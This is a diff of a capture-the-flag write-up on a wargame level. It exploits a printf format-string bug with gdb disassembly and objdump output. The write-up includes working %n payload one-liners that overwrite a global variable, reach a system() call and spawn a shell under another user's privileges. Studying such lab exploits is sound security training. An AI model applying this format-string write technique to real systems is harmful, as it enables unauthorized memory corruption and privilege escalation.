@@ -1,61 +1,21 @@
-string format bug 
+The <main> function makes a call to <v> function.
 
-$ python -c 'print "AAAA" + "%x" * 100'  | ./level3 
-AAAA200 b7fd1ac0 b7ff37d0 41414141 25207825  <-- stack values 
-78252078 20782520 25207825 78252078 20782520 
-25207825 78252078 20782520 25207825 
-78252078 20782520 25207825 78252078 20782520
+$ (gdb) disas main
+...
+0x08048520 <+6>:	call   0x80484a4 <v>
+...
 
-with printf we can replace a value with %n 
+To get to the <system> call we need to pass the following check that compares
+the variable <m> to 0x40 (64)
 
-# look at the v fct 
-$ gdb 
-   0x080484d5 <+49>:	call   0x8048390 <printf@plt> <-- insecure call to printf 
-=> 0x080484da <+54>:	mov    eax,ds:0x804988c
-   0x080484df <+59>:	cmp    eax,0x40 <-- cmp 0x804988c with 0x40
-   0x080484e2 <+62>:	jne    0x8048518 <v+116> <-- if nor equal ret 
-   0x080484e4 <+64>:	mov    eax,ds:0x8049880 <--else
-   0x080484e9 <+69>:	mov    edx,eax
-   0x080484eb <+71>:	mov    eax,0x8048600
-   0x080484f0 <+76>:	mov    DWORD PTR [esp+0xc],edx
-   0x080484f4 <+80>:	mov    DWORD PTR [esp+0x8],0xc
-   0x080484fc <+88>:	mov    DWORD PTR [esp+0x4],0x1
-   0x08048504 <+96>:	mov    DWORD PTR [esp],eax
-   0x08048507 <+99>:	call   0x80483b0 <fwrite@plt>
-   0x0804850c <+104>:	mov    DWORD PTR [esp],0x804860d
-   0x08048513 <+111>:	call   0x80483c0 <system@plt> <-- syscall bash
-   0x08048518 <+116>:	leave  
-   0x08048519 <+117>:	ret  
+$ (gdb) disas v
+...
+0x080484da <+54>:	mov    eax, ds:0x804988c
+0x080484df <+59>:	cmp    eax, 0x40
+...
 
-# find the value to override 
-$ objdump -t level3 
-[...]
-080483f0 g     F .text	00000000              _start
-080485f8 g     O .rodata	00000004              _fp_hw
-0804988c g     O .bss	00000004              m <<---- here the m variable as we saw in gdb  
-08049880 g     O .bss	00000004              stdout@@GLIBC_2.0
-08049844 g       *ABS*	00000000              __bss_start
-0804851a g     F .text	0000000d              main
-[...]
+To do so, we exploit the printf %n format which allows us to write a value at any address we want.
+Playing around with printf we see that we control the 4th argument on the stack.
+So in the end we have to write 64 bytes at 0x0804988c.
 
-
-# find the offset 
-
-$ python -c 'print "AAAAAAAA" + "\x08\x04\x98\x8c"[::-1] + "%x "* 5 + "%x "' | ./level3 
-AAAAAAAA��200 b7fd1ac0 b7ff37d0 41414141 41414141 804988c 
-
-if we change the last %x with a %n it will not segfault but write the number of char print before the %n at the first stack addr, here \x08\x04\x98\x8c.
-as we can see in gdb, a bp after printf will give us : 
-  
-0024| 0xbffff528 --> 0x804988c --> 0x34 ('4')
-SO we just need to write 12 more A just after the address of $m. 
-
-here we go with the cat <(...)- to catch the shell 
- 
-$ cat <(python -c 'print "BBBBBBBB" + "\x08\x04\x98\x8c"[::-1] + "%x "* 5 + "AAAAAAAAAAAA"+"%n "') - | ./level3 
-BBBBBBBB��200 b7fd1ac0 b7ff37d0 42424242 42424242 AAAAAAAAAAAA 
-Wait what?!
-id
-uid=2022(level3) gid=2022(level3) euid=2025(level4) egid=100(users) groups=2025(level4),100(users),2022(level3)
- 
-whooo
+$ cat <(python -c "print('\x8c\x98\x04\x08' + 'A' * 60 + '%4\$n')") - | ./level3
